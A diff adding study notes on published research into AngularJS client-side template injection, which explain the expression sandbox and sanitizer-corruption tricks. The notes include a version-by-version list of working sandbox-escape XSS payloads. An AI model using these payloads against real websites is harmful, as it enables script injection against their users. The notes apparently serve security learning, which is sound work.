@@ -1,0 +1,160 @@
+https://portswigger.net/research/xss-without-html-client-side-template-injection-with-angularjs
+
+Abstract:
+- Naive use of AngularJS is exposing numerous website to Angular Template Injection
+- This relatively low profile sibling of SSTI can be combined with Angular sandbox escape to perform XSS attack on secure sites.
+- Until now, has been no publicly known sandbox escape affecting Angular 1.3.1+ and 1.4.0+
+
+Introduction:
+- AngularJS is an MVC (model view controller) client side framework written by Google.
+- Web using this contain 'ng-app' are actually templates and rendered by Angular
+-> If user input embedded into page, application may be vuln to client-side template Injection
+- This can contain expression - like JS code inside double curly braces.
+    Example: https://jsfiddle.net/2zs2yv7o/
+- It can't do much their own, but when combined with a sandbox escape, we can execute arbitrary JavaScript and do some serious damage.
+
+
+Sandbox:
+- "To maintain a proper separation of application responsibilities"
+- Angular expressions are not executed directly
+    Example:
+    {{1+1}} -> parse expression -> generate JS code -> build runtime function -> execute
+- To exploit users, attackers need to escape the sandbox and achieve arbitrary JavaScript execution.
+
+{{1+1}} is transformed into:
+    "use strict";
+    var fn = function(s, l, a, i) {
+        return plus(1, 1);
+    };
+- Analyze:
+    + "use strict": enables strict mode, blocks some unsafe JS behaviors, prevents accidental globals
+        Example: x = 1 → ReferenceError
+    + function(scope, local, assign, input/internal optimization)
+    + return plus(1,1): wrap operators using help functions
+
+{{constructor.constructor('alert(1)')()}} is transformed into: see in paper
+
+- 'ensureSafeObject' function block if the object is Function constructor, Window object, DOM element, Object constructor (https://github.com/angular/angular.js/blob/v1.4.6/src/ng/parse.js#L60-L85)
+    + If match any condition, will throw error
+- 'ensureSafeMemberName' checks a JavaScript property and makes sure it doesn't contain __proto__ and dangerous property
+- 'ensureSafeFunction' checks function calls do not call the Function constructor or call, apply and bind.
+
+- Prevents access to global variables by making all references for globals look at a object property instead.
+    + Block global var like window, document, alert, Function
+    + Rewrite to scope.alert or locals.alert instead of window.alert
+
+
+Corrupting the sanitizer:
+- The Angular sanitizer: Client side filter written in JS to safely allow HTML bindings using attributes called ng-bind-html that contain a reference you want to filter
+- Technique 1: Backdoor String.fromCharCode
+    + Problem: angular expression not support function statement or function expression
+    + Notice about String.fromCharCode, it called from String constructor and not via string literal
+    -> this value will be String constructor and maybe could backdoor this function without create a function
+    + Problem: how to control the value every time fromCharCode is called
+    + Solution: use array [].join function to make String constructor fake array
+        + Fake array: only need length property and property of 0 for first index
+            Example: join function will think this is a array
+                obj = {
+                    0: "hello",
+                    length: 1
+                }
+        + Because string already have length, we only need String[0]
+        + Payload: 
+            {{
+                'a'.constructor.fromCharCode=[].join;
+                'a'.constructor[0]='\u003ciframe onload=alert(/Backdoored/)\u003e';    
+            }}
+            + 'a'.constructor.fromCharCode=[].join; -> String.fromCharCode = Array.prototype.join
+            + 'a'.constructor[0]='\u003ciframe onload=alert(/Backdoored/)\u003e'; -> String[0] = "<iframe onload=alert(/Backdoored/)>"
+            + Look like:
+            {
+                0: "<iframe onload=alert(/Backdoored/)>",
+                length: 1
+            }
+  Technique 2: Backdoor String.charCodeAt()
+    + Target: overwrite this value to get injected into attribute without any filtering
+    + Problem: this time "this" value is string literal and not constructor
+    -> Unable to manipulate index of the length because this isn't writable for string literal
+    + Solution: using [].concat, would return string + argument, concatenated together
+    + 'abc'.charCodeAt(0) would expect to return '97', but due to backdoor, it instead return base string plus argument ('abc0')
+    + Payload:
+        {{ 'a'.constructor.prototype.charCodeAt=[].concat }}
+    + Developer expect charCodeAt return int, so we can inject payload here
+        Example: return '&#' + value.charCodeAt(i) + ';';
+    + That can bypass sanitizer and using similar technique, we can break out of the sandbox
+
+
+Escaping the sandbox:
+- Apply the same trick with charAt() function
+- Payload:
+    {{
+        'a'.constructor.prototype.charAt = [].join;
+        $eval('x=alert(1)')
+    }}
+- Payload for Angular 1.4:
+    {{
+        'a'.constructor.prototype.charAt=[].join;
+        $eval('x=1} } };alert(1)//');
+    }}
+
+This easier to understand: https://www.slideshare.net/slideshow/jsmvcomfg-to-sternly-look-at-javascript-mvc-and-templating-frameworks/29158265
+
+https://code.google.com/archive/p/mustache-security/
+
+References blog i want to read:
+- https://portswigger.net/research/adapting-angularjs-payloads-to-exploit-real-world-applications
+- https://portswigger.net/research/dom-based-angularjs-sandbox-escapes
+
+
+List of Sandbox bypasses:
+- 1.0.1 - 1.1.5: {{constructor.constructor('alert(1)')()}}
+- 1.2.0 - 1.2.1: {{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}
+- 1.2.2 - 1.2.5: {{'a'[{toString:[].join,length:1,0:'__proto__'}].charAt=''.valueOf;$eval("x='"+(y='if(!window\\u002ex)alert(window\\u002ex=1)')+eval(y)+"'");}}
+- 1.2.6 - 1.2.18: {{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(1)')()}}
+- 1.2.19 - 1.2.23: {{toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor);}}
+- 1.2.24 - 1.2.29: {{'a'.constructor.prototype.charAt=''.valueOf;$eval("x='\"+(y='if(!window\\u002ex)alert(window\\u002ex=1)')+eval(y)+\"'");}}
+- 1.3.0: 
+    {{!ready && (ready = true) && (
+      !call
+      ? $$watchers[0].get(toString.constructor.prototype)
+      : (a = apply) &&
+        (apply = constructor) &&
+        (valueOf = call) &&
+        (''+''.toString(
+          'F = Function.prototype;' +
+          'F.apply = F.a;' +
+          'delete F.a;' +
+          'delete F.valueOf;' +
+          'alert(1);'
+        ))
+    );}}
+- 1.3.1 - 1.3.2: {{
+    {}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;
+    'a'.constructor.prototype.charAt=''.valueOf; 
+    $eval('x=alert(1)//'); 
+}}
+- 1.3.3 - 1.3.18: {{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)//'); }}
+- 1.3.19: {{
+    'a'[{toString:false,valueOf:[].join,length:1,0:'__proto__'}].charAt=[].join; 
+    $eval('x=alert(1)//'); 
+}}
+- 1.3.20: {{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}
+- 1.4.0 - 1.4.9: {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}
+- 1.5.0 - 1.5.8: {{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}} 
+- 1.5.9 - 1.5.11: {{
+    c=''.sub.call;b=''.sub.bind;a=''.sub.apply;
+    c.$apply=$apply;c.$eval=b;op=$root.$$phase;
+    $root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString;
+    C=c.$apply(c);$root.$$phase=op;$root.$digest=od;
+    B=C(b,c,b);$evalAsync("
+    astNode=pop();astNode.type='UnaryExpression';
+    astNode.operator='(window.X?void0:(window.X=true,alert(1)))+';
+    astNode.argument={type:'Identifier',name:'foo'};
+    ");
+    m1=B($$asyncQueue.pop().expression,null,$root);
+    m2=B(C,null,m1);[].push.apply=m2;a=''.sub;
+    $eval('a(b.c)');[].push.apply=a;
+}}
+- >=1.6.0: {{constructor.constructor('alert(1)')()}}
+
+- Angular as of version 1.6 have removed the sandbox altogether
